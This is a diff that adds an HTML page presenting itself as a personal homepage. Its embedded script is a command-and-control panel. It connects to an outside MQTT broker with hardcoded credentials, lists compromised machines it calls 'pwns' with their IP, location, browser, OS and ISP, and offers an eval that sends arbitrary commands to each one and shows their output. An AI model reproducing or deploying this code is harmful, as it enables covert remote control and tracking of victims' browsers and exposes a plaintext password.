@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="description" content="reedleoneil">
+    <meta name="keywords" content="reedleoneil">
+    <meta name="author" content="reedleoneil">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>reedleoneil</title>
+    <link rel="icon" type="image/png" href="https://reedleoneil.github.io/IMG_0020.PNG">
+    <link rel="stylesheet" href="https://cdn.rawgit.com/konpa/devicon/df6431e323547add1b4cf45992913f15286456d3/devicon.min.css">
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.3.1/css/all.css" integrity="sha384-mzrmE5qonljUremFsqc01SB46JvROS7bZs3IO2EmfFsd15uHvIt+Y8vEf7N7fWAU" crossorigin="anonymous">
+    <style>
+        body {
+            font-family: monospace;
+            width: 100%;
+            margin: 0 auto 30px;
+            max-width: 30em;
+            padding-left: 15px;
+            padding-right: 15px;
+        }
+
+        h1 {
+            font-family: ui-monospace;
+        }
+
+        button {
+            position: inline;
+            float: right;
+        }
+
+        body.dark-mode {
+            background-color: #000000;
+            color: #d5d5d5;
+            text-shadow: -0.01px -0.01px 0 #696969, 0.01px -0.01px 0 #696969, -0.01px 0.01px 0 #696969, 0.01px 0.01px 0 #696969, -0.01px -0.01px 3px #696969, 0.01px -0.01px 3px #696969, -0.01px 0.01px 3px #696969, 0.01px 0.01px 3px #696969;
+        }
+
+        a:link, a:active, a:visited, nav a:link, nav a:active {
+            color: #000000;
+            text-decoration: none;
+        }
+
+        a.dark-mode:link, a.dark-mode:active, a.dark-mode:visited {
+            color: #d5d5d5;
+            text-shadow: -0.01px -0.01px 0 #696969, 0.01px -0.01px 0 #696969, -0.01px 0.01px 0 #696969, 0.01px 0.01px 0 #696969, -0.01px -0.01px 3px #696969, 0.01px -0.01px 3px #696969, -0.01px 0.01px 3px #696969, 0.01px 0.01px 3px #696969;
+            text-decoration: none;
+        }
+
+        a:hover {
+            color: #bc002d;
+            text-decoration: none;
+        }
+
+        a.dark-mode:hover {
+            color: #ff4b75;
+            text-shadow: -0.03px -0.03px 0 #DC143C, 0.03px -0.03px 0 #DC143C, -0.03px 0.03px 0 #DC143C, 0.03px 0.03px 0 #DC143C, -0.03px -0.03px 3px #DC143C, 0.03px -0.03px 3px #DC143C, -0.03px 0.03px 3px #DC143C, 0.03px 0.03px 3px #DC143C;
+            text-decoration: none;
+        }
+    </style>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jsencrypt/2.3.1/jsencrypt.min.js" integrity="sha512-zDvrqenA0eFJZCxBsryzUZcvihvNlEXbteMv62yRxdhR4s7K1aaz+LjsRyfk6M+YJLyAJEuuquIAI8I8GgLC8A==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ClientJS/0.1.11/client.min.js" integrity="sha512-MwKUpp841sot4mmGDfVcpJxb4vcaYHnpyn17CTHT3RUm585khw5gnRM6xwDm15aJ3sfpf6d4P8FLLfQKAo3mfA==" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/mqtt/4.2.8/mqtt.min.js" integrity="sha512-QhwpmT5Q0jBh/70LYcUtOVomQyPfvRv3iWg2MzxKn4OjYcZdE5PBbfE8LMEdNx3IW0rO9OtWzPbxckRh/g8TSw==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+</head>
+<body>
+    <script type="text/javascript">
+    let _rho = {
+        mqttClient: null,
+        pwns: [],
+        connect: () => {
+            _rho.mqttClient = mqtt.connect("wss://8e86d252f3c44fca8ce087b965c40d47.s1.eu.hivemq.cloud", {
+                port: 8884,
+                protocol: "wss",
+                username: "reedleoneil",
+                password: "P@$$w0rd",
+                path: "/mqtt"
+            });
+            _rho.mqttClient.on("connect", _rho.onConnect);
+            _rho.mqttClient.on("message", _rho.onMessage);
+            _rho.mqttClient.subscribe("rho/#");
+        },
+        onConnect: () => {              
+            console.log("Connected!");
+        },
+        onMessage: (topic, payload) => {
+            topic = topic.split("/");
+            var root = topic[0],
+                fingerprint = topic[1],
+                stdio = topic[2];
+            if (root == "rho")
+            switch (topic.length) {
+                case 2: // fingerprint
+                    payload = JSON.parse(payload);
+
+                    if (!_rho.pwns.find(p => p.fingerprint == fingerprint)) 
+                        _rho.pwns.push(payload);
+                    else
+                        _rho.pwns = _rho.pwns.map(p => {
+                            if (p.fingerprint == fingerprint) {
+                               p = payload 
+                            }
+                            return p;
+                        });
+
+                    rho["$" + fingerprint] = { 
+                        eval: (cmd) => _rho.mqttClient.publish("rho/" + fingerprint + "/stdin", cmd),
+                        info: payload,
+                    };
+
+                    if (payload.status == "Offline") {
+                        delete rho["$" + fingerprint].eval;
+                    }
+
+                    break;
+                case 3: // stdio
+
+                    switch (stdio) {
+                        case "stdin":
+                            console.info("%c" + fingerprint + ": %c" + payload, "font-weight: bold;", "");
+                            break;
+                        case "stdout":
+                            try {
+                                console.log(JSON.parse(payload));
+                            } catch (err) {
+                                console.error("%c" + fingerprint + ": %c" + payload, "font-weight: bold;", "");
+                            }
+                            break;
+                        case "stderr":
+                            console.warn("%c" + fingerprint + ": %c" + payload, "font-weight: bold;", "");
+                            break;
+                        default:
+                            console.error("%c" + fingerprint + ": %c" + payload, "font-weight: bold;", "");
+                            break;
+                    }
+                    break;    
+            }
+        },
+    };
+
+    let rho = {
+        $all: {
+            test: () => { console.log("test") }
+        },
+        ls: () => {
+            let pwns = _rho.pwns.map(element => ({ 
+                "ID": element.fingerprint,
+                "IP ADDRESS": element.ipAddressGeolocation.ip,
+                "LOCATION": element.ipAddressGeolocation.city + " " + element.ipAddressGeolocation.country_name,
+                "BROWSER": element.browserData.browser.name + " " + element.browserData.browser.version,
+                "OPERATING SYSTEM": element.browserData.os.name + " " + element.browserData.os.version,
+                "ISP": element.ipAddressGeolocation.org,
+                "STATUS": element.status,
+             }));
+            console.table(pwns);
+            return "ONLINE: " + _rho.pwns.filter(e => e.status == "Online").length + " " +
+                   "OFFLINE: " + _rho.pwns.filter(e => e.status == "Offline").length;
+        },
+    };
+
+    _rho.connect();
+    </script>
+</body>
+</html>
